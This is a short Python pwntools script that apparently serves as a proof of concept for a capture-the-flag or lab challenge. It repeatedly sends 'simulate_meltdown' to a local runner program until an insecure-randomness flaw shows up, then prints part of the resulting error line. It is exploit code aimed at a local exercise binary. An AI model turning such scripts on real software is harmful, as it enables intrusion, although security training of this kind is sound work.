#!/usr/bin/python3

from pwn import *
import os
import warnings

def main():
    warnings.filterwarnings("ignore", category=BytesWarning)
    context.log_level = 'error'

    env = os.environ.copy()
    env['LD_LIBRARY_PATH'] = './runner/external/'

    pid = process(['./runner/run.sh'], env=env)

    while True:
        pid.recv(numb=100, timeout=1.0)
        pid.sendline(b'simulate_meltdown')

        line = pid.recvline_startswith("Critical Error:", timeout=1.0)

        if (line != b''):
            print(text.red("[+]") + " Vuln Insecure Randomness - simulate_meltdown:")
            print(line.decode().split(" ")[5])
            print()
            return

if __name__ == "__main__":
    main()